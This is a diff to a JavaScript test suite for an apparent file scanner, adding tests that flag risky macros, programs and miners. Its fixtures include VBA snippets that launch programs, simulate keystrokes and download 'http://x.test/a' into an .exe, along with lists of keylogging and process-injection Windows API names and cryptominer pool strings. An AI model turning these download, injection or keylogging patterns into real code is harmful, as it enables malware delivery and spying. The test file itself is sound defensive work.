@@ -282,7 +282,7 @@ test('every field survives the event envelope (which owns type, kind, v and t)',
 
 test('the finding ids form the fixed set', () => {
   assert.equal(FINDING_IDS.length, new Set(FINDING_IDS).size);
-  assert.equal(FINDING_IDS.length, 24);
+  assert.equal(FINDING_IDS.length, 31);
 });
 
 test('the type comes from the content, not from the name', () => {
@@ -849,4 +849,67 @@ test('the event stays small even when every cap is reached', () => {
   assert.ok(r.findings.every((f) => f.detail.length <= FILE_LIMITS.detailChars));
   assert.ok(JSON.stringify(r).length < 100 * 1024);
   assert.equal(r.truncated, true);
+});
+
+// ---- what a macro can do, what a program names, a miner's words (added 9 Nov 2026) ---------------------------------------------
+
+const macroDoc = (source) => analyze('a.docm', docx({ name: 'word/vbaProject.bin', data: ovbaLiteral(`Attribute VB_Name = "M"\r\n${source}\r\n`) }));
+
+test('macro source: hotkeys, programs, downloads and keystrokes are named; a macro with none of them is only macros', () => {
+  const hot = macroDoc('Sub Helper()\r\n  Application.OnKey "^j", "Steal"\r\nEnd Sub');
+  hasFinding(hot, 'macro_hotkey');
+  assert.equal(detail(hot, 'macro_hotkey'), 'Application.OnKey');
+  hasFinding(macroDoc('Sub Helper()\r\n  CreateObject("WScript.Shell").Run "calc"\r\nEnd Sub'), 'macro_shell');
+  hasFinding(macroDoc('Sub Helper()\r\n  Shell "calc"\r\nEnd Sub'), 'macro_shell');
+  hasFinding(macroDoc('Sub Helper()\r\n  URLDownloadToFile 0, "http://x.test/a", "a.exe", 0, 0\r\nEnd Sub'), 'macro_download');
+  hasFinding(macroDoc('Sub Helper()\r\n  Set x = CreateObject("MSXML2.XMLHTTP")\r\nEnd Sub'), 'macro_download');
+  hasFinding(macroDoc('Sub Helper()\r\n  SendKeys "%{F4}"\r\nEnd Sub'), 'macro_keystrokes');
+  const quiet = macroDoc('Sub Helper()\r\n  Range("A1").Value = 1\r\nEnd Sub');
+  hasFinding(quiet, 'macros');
+  for (const id of ['macro_hotkey', 'macro_shell', 'macro_download', 'macro_keystrokes']) noFinding(quiet, id);
+  // words that only look alike: an identifier that ends in Shell, a variable named like a function
+  noFinding(macroDoc('Sub Helper()\r\n  MyShell = 1\r\n  Dim Application_OnKey\r\nEnd Sub'), 'macro_shell');
+  noFinding(macroDoc('Sub Helper()\r\n  Dim Application_OnKey\r\nEnd Sub'), 'macro_hotkey');
+});
+
+test('macro source: every container is read, so a hit after an auto-run name is found too', () => {
+  const r = macroDoc('Sub AutoOpen()\r\n  Application.OnKey "^j", "x"\r\n  SendKeys "a"\r\nEnd Sub');
+  hasFinding(r, 'auto_exec');
+  hasFinding(r, 'macro_hotkey');
+  hasFinding(r, 'macro_keystrokes');
+});
+
+test('a program: the keyboard functions it names, and writing into other programs only when several are named', () => {
+  const withNames = (...names) => Buffer.concat([pe(), Buffer.from(names.join('\0') + '\0', 'latin1')]);
+  const keys = analyze('a.exe', withNames('SetWindowsHookExA', 'GetAsyncKeyState'));
+  hasFinding(keys, 'pe_keyboard_api');
+  assert.equal(detail(keys, 'pe_keyboard_api'), 'SetWindowsHookExA, GetAsyncKeyState');
+  noFinding(keys, 'pe_injection_api');
+  hasFinding(analyze('a.exe', withNames('RegisterHotKey')), 'pe_keyboard_api');
+  noFinding(analyze('a.exe', withNames('WriteProcessMemory')), 'pe_injection_api');
+  const inject = analyze('a.exe', withNames('VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'));
+  hasFinding(inject, 'pe_injection_api');
+  const plain = analyze('a.exe', pe());
+  for (const id of ['pe_keyboard_api', 'pe_injection_api', 'miner_strings']) noFinding(plain, id);
+  // the same words in a document are only words
+  noFinding(analyze('a.txt', 'SetWindowsHookExA GetAsyncKeyState'), 'pe_keyboard_api');
+});
+
+test('a miner states its pool or its algorithm: found in what can run, not in a document that talks about miners', () => {
+  const js = analyze('a.js', 'var c = new Worker("stratum+tcp://pool.example:3333");');
+  hasFinding(js, 'miner_strings');
+  assert.match(detail(js, 'miner_strings'), /^stratum\+tcp:\/\/pool\.example/);
+  hasFinding(analyze('a.html', '<script src="x.js"></script><script>new CoinHive.Anonymous("k").start()</script>'), 'miner_strings');
+  hasFinding(analyze('a.exe', Buffer.concat([pe(), Buffer.from('xmrig 6.1 randomx', 'latin1')])), 'miner_strings');
+  noFinding(analyze('a.txt', 'Notes on how xmrig and stratum+tcp://pool.example work'), 'miner_strings');
+  noFinding(analyze('a.pdf', pdf('<< /Title (xmrig) >>')), 'miner_strings');
+  noFinding(analyze('a.js', 'var greeting = "hello";'), 'miner_strings');
+});
+
+test('AutoHotkey and AutoIt files are scripts', () => {
+  for (const name of ['keys.ahk', 'run.au3']) {
+    const r = analyze(name, '^j::MsgBox hi');
+    assert.equal(r.file_type, 'script', name);
+    hasFinding(r, 'script_file');
+  }
 });
